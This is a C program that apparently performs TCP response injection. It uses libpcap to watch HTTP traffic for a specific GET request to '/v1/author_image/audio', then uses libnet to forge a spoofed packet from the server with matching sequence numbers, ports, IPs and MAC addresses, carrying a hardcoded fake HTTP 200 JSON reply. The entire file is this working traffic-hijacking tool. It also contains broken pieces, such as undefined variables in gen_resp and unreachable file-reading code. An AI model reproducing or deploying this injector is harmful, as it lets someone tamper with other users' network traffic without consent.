#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <libnet.h>
#include <pcap.h> 
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <semaphore.h>

pthread_t g_libnet_thread;
const char* g_sendNetCard = "eth2";
const char* g_recvNetCard = "eth1";

sem_t sem;//信号量

uint8_t g_send_payload[1024] = { 0x00 };
int g_payload_s = 1024;

u_int seqno, ackno;
u_short dp, sp;
unsigned int src_ip;
unsigned int dst_ip;//目的ip
uint8_t  * src_mac = NULL;
uint8_t  * dst_mac = NULL;



void show_packet_info()
{
	printf("=================================================================\n");
	//printf("%s", payload);
	printf("Src Port: %d\n", sp);
	printf("Dst Port: %d\n", dp);
	printf("Squence Number: %ld\n", seqno);
	printf("ACK Number: %ld\n", ackno);
	//printf("Header Length: %d\n", (tcpheader->th_flags & 0xf0) >> 4);
	//printf("FLAG: %d\n", tcpheader->th_flags);
	////printf("Flag: %s\n", tcp_flag(tcpheader->m_sHeaderLenAndFlag));
	//printf("Window Size: %d\n", ntohs(tcpheader->th_win));
	//printf("Checksum: %d\n", ntohs(tcpheader->th_sum));
	//printf("Urgent Pointer: %d\n", ntohs(tcpheader->th_urp));

	//printf("src_ip: %s\n", libnet_addr2name4(src_ip, LIBNET_DONT_RESOLVE));
	//printf("dst_ip: %s\n", libnet_addr2name4(dst_ip, LIBNET_DONT_RESOLVE));
}

void send_ack(libnet_t *lib_net)
{
	libnet_ptag_t tcp_tag = libnet_build_tcp(
		sp,
		dp,
		seqno,
		ackno,
		TH_ACK,
		14600,
		0,
		0,
		LIBNET_TCP_H,
		NULL,
		0,
		lib_net,
		0);
	if (-1 == tcp_tag)
	{
		printf("tcp_tag error!\n");
	}

	libnet_ptag_t ip_tag = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_TCP_H,
		0,
		(u_short)libnet_get_prand(LIBNET_PRu16),
		0,
		libnet_get_prand(LIBNET_PR8),
		IPPROTO_TCP,//pro
		0,
		src_ip,
		dst_ip,
		NULL,
		0,
		lib_net,
		0
	);

	if (-1 == ip_tag)
	{
		printf("ip_tag error!\n");
	}


	libnet_ptag_t lib_t = libnet_build_ethernet((uint8_t *)dst_mac, (uint8_t *)src_mac, ETHERTYPE_IP, NULL, 0, lib_net, 0);

	if (-1 == lib_t)
	{
		printf("lib_t error!\n");
	}

	int page_size = libnet_write(lib_net);
	if (page_size <= 0)
	{
		printf(" error send ack %d size \n", page_size);
	}
}

void send_payload(libnet_t *lib_net)
{

	libnet_ptag_t tcp_tag = libnet_build_tcp(
		sp,
		dp,
		seqno,
		ackno,
		TH_PUSH | TH_ACK,
		14600,
		0,
		0,
		LIBNET_TCP_H + g_payload_s,
		g_send_payload,
		g_payload_s,
		lib_net,
		0);

	if (-1 == tcp_tag)
	{
		printf("tcp_tag error!\n");
	}
	libnet_ptag_t ip_tag = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_TCP_H + g_payload_s,
		0,
		(u_short)libnet_get_prand(LIBNET_PRu16),
		0,
		libnet_get_prand(LIBNET_PR8),
		IPPROTO_TCP,//pro
		0,
		src_ip,
		dst_ip,
		NULL,
		0,
		lib_net,
		0
	);


	if (-1 == ip_tag)
	{
		printf("ip_tag error!\n");
	}

	libnet_ptag_t lib_t = libnet_build_ethernet((uint8_t *)dst_mac, (uint8_t *)src_mac, ETHERTYPE_IP, NULL, 0, lib_net, 0);

	if (-1 == lib_t)
	{
		printf("lib_t error!\n");
	}

	int page_size = libnet_write(lib_net);
	if (page_size < 0)
	{
		printf("error send send_payload %d size.\n", page_size);
	}

}


void* libnet_sendpacket(void *arg)
{
	char err_buf_libnet[100] = { 0 };
	libnet_t *lib_net_ack = libnet_init(LIBNET_LINK, g_sendNetCard, err_buf_libnet);
	if (NULL == lib_net_ack)
	{
		printf("lib_net_ack init error:%s\n", err_buf_libnet);
		return NULL;
	}

	libnet_t *lib_net = libnet_init(LIBNET_LINK, g_sendNetCard, err_buf_libnet);
	if (NULL == lib_net)
	{
		printf("lib_net init error:%s\n", err_buf_libnet);
		return NULL;
	}


	//libnet_ptag_t tcp_tag, ip_tag;

	while (1)
	{

		libnet_clear_packet(lib_net_ack);
		libnet_clear_packet(lib_net);

		show_packet_info();

		//发现需要修改的包
		sem_wait(&sem);

		//		send_ack(lib_net_ack);
		send_payload(lib_net);

	}

	libnet_destroy(lib_net);
	libnet_destroy(lib_net_ack);
}

void tcp_callback(u_char *arg, const struct pcap_pkthdr *pcap_pkt, const u_char *packet)
{
	struct libnet_ethernet_hdr *ethheader = (struct libnet_ethernet_hdr*)(packet);
	struct libnet_ipv4_hdr* ipptr = (struct libnet_ipv4_hdr*)(packet + LIBNET_ETH_H);
	int size_ip = ipptr->ip_hl * 4;//IP_HL(ipptr) * 4;
	struct libnet_tcp_hdr *tcpheader = (struct libnet_tcp_hdr *)(packet + LIBNET_ETH_H + size_ip);
	int size_tcp = tcpheader->th_off * 4;    //TH_OFF(tcpheader) * 4;

	const u_char * payload = (u_char *)(packet + LIBNET_ETH_H + size_ip + size_tcp);
	int size_payload = ntohs(ipptr->ip_len) - (size_ip + size_tcp);

	const char* szFindKey = "GET /v1/author_image/audio HTTP/1.1";
	int szFindKey_len = strlen(szFindKey);
	if (size_payload > szFindKey_len)
		//if (size_payload > 300)
	{
		if (0 == strncmp((const char *)payload, (const char *)szFindKey, szFindKey_len))
		{
			seqno = ntohl(tcpheader->th_ack);
			ackno = ntohl(tcpheader->th_seq) + size_payload;
			dp = ntohs(tcpheader->th_sport);
			sp = ntohs(tcpheader->th_dport);
			src_ip = ipptr->ip_dst.s_addr;
			dst_ip = ipptr->ip_src.s_addr;

			src_mac = ethheader->ether_dhost;
			dst_mac = ethheader->ether_shost;
			//strncpy(src_mac, (ethheader->m_cDstMacAddress),6);
			//strncpy(dst_mac, (ethheader->m_cSrcMacAddress), 6);
			//dst_mac = ethheader->m_cSrcMacAddress;

			sem_post(&sem);
		}
	}

}

void pcap_callback(unsigned char *arg, const struct pcap_pkthdr *pcap_pkt, const unsigned char *packet)
{

	struct libnet_ethernet_hdr *ethheader = (struct libnet_ethernet_hdr*)packet;
	u_short protocol = ntohs(ethheader->ether_type);
	if (0x0800 == protocol)
	{
		struct libnet_ipv4_hdr* ipptr = (struct libnet_ipv4_hdr*)(packet + LIBNET_ETH_H);//得到ip包头
		if (6 == ipptr->ip_p)
			tcp_callback(arg, pcap_pkt, packet);
	}

}

void gen_resp()
{

	char szStatusCode[20] = { 0 };
	char szContentType[20] = { 0 };
	char szServerName[20] = { 0 };
	strcpy(szStatusCode, "200 OK");
	strcpy(szContentType, "application/json;charset=utf-8");
	strcpy(szServerName, "openresty");
	char szDT[128];
	struct tm *newtime;
	long ltime;
	time(&ltime);
	newtime = gmtime(&ltime);
	strftime(szDT, 128, "%a, %d %b %Y %H:%M:%S GMT", newtime);
	bool bKeepAlive = true;
	int length = _buf_size;

	/*
	HTTP/1.1 200 OK
	Date: Wed, 26 Dec 2018 03:55:04 GMT
	Content-Type: application/json;charset=utf-8
	Transfer-Encoding: chunked
	Connection: keep-alive
	Vary: Accept-Encoding
	*/

	sprintf(_ResponseHeader, "HTTP/1.1 %s\r\nDate: %s\r\nServer: %s\r\nAccept-Ranges: none\r\nContent-Length: %d\r\nConnection: %s\r\nCache - Control: max - age = 0\r\nContent-Type: %s\r\n\r\n",
		szStatusCode, szDT, szServerName, length, bKeepAlive ? "Keep-Alive" : "close", szContentType);   //响应报文
}

void read_out_payload_from_file()
{

	memset(g_send_payload, 0x00, g_payload_s);
	unsigned char mydata[230] = {
		0x48, 0x54, 0x54, 0x50, 0x2F, 0x31, 0x2E, 0x31, 0x20, 0x32, 0x30, 0x30, 0x20, 0x4F, 0x4B, 0x0D,
		0x0A, 0x44, 0x61, 0x74, 0x65, 0x3A, 0x20, 0x57, 0x65, 0x64, 0x2C, 0x20, 0x32, 0x36, 0x20, 0x44,
		0x65, 0x63, 0x20, 0x32, 0x30, 0x31, 0x38, 0x20, 0x30, 0x33, 0x3A, 0x35, 0x35, 0x3A, 0x30, 0x34,
		0x20, 0x47, 0x4D, 0x54, 0x0D, 0x0A, 0x43, 0x6F, 0x6E, 0x74, 0x65, 0x6E, 0x74, 0x2D, 0x54, 0x79,
		0x70, 0x65, 0x3A, 0x20, 0x61, 0x70, 0x70, 0x6C, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x2F,
		0x6A, 0x73, 0x6F, 0x6E, 0x3B, 0x63, 0x68, 0x61, 0x72, 0x73, 0x65, 0x74, 0x3D, 0x75, 0x74, 0x66,
		0x2D, 0x38, 0x0D, 0x0A, 0x54, 0x72, 0x61, 0x6E, 0x73, 0x66, 0x65, 0x72, 0x2D, 0x45, 0x6E, 0x63,
		0x6F, 0x64, 0x69, 0x6E, 0x67, 0x3A, 0x20, 0x63, 0x68, 0x75, 0x6E, 0x6B, 0x65, 0x64, 0x0D, 0x0A,
		0x43, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x3A, 0x20, 0x6B, 0x65, 0x65, 0x70,
		0x2D, 0x61, 0x6C, 0x69, 0x76, 0x65, 0x0D, 0x0A, 0x56, 0x61, 0x72, 0x79, 0x3A, 0x20, 0x41, 0x63,
		0x63, 0x65, 0x70, 0x74, 0x2D, 0x45, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E, 0x67, 0x0D, 0x0A, 0x0D,
		0x0A, 0x32, 0x61, 0x0D, 0x0A, 0x7B, 0x22, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x22, 0x3A, 0x31,
		0x2C, 0x22, 0x65, 0x72, 0x72, 0x6F, 0x72, 0x5F, 0x63, 0x6F, 0x64, 0x65, 0x22, 0x3A, 0x38, 0x38,
		0x38, 0x38, 0x38, 0x2C, 0x22, 0x64, 0x61, 0x74, 0x61, 0x22, 0x3A, 0x22, 0x22, 0x7D, 0x0A, 0x0D,
		0x0A, 0x30, 0x0D, 0x0A, 0x0D, 0x0A
	};

	memcpy(g_send_payload, mydata, 230);

	return;


	const char* http_header = "HTTP/1.1 200 OK\r\n\r\n";
	char szPayload[1024] = { 0x00 };
	int szLen = 0;

	const char* payload_file = "./kugou21.file";
	FILE* fp = fopen(payload_file, "r");
	if (fp)
	{
		while (!feof(fp))
		{
			memset((char*)szPayload, 0, sizeof(szPayload));
			fgets((char*)szPayload, sizeof(szPayload), fp);
		}

		fseek(fp, 0, SEEK_END);
		g_payload_s = ftell(fp);
	}
	fclose(fp);

	strncpy((char*)g_send_payload, http_header, strlen(http_header));
	strncat((char*)g_send_payload, szPayload, g_payload_s);
	g_payload_s = g_payload_s + strlen(http_header);

}



int main()
{
	read_out_payload_from_file();

	sem_init(&sem, 0, 0);
	pthread_create(&g_libnet_thread, NULL, libnet_sendpacket, NULL);

	char err_buf[100] = { 0 };
	pcap_t * pcap_handle = pcap_open_live(g_recvNetCard, 65536, 1, 0, err_buf);

	struct bpf_program filter;
	pcap_compile(pcap_handle, &filter, "tcp dst port 80", 1, 0);
	pcap_setfilter(pcap_handle, &filter);


	while (1)
	{
		pcap_loop(pcap_handle, 1, pcap_callback, NULL);
	}


	sem_destroy(&sem);
	pcap_close(pcap_handle);

	return 0;
}
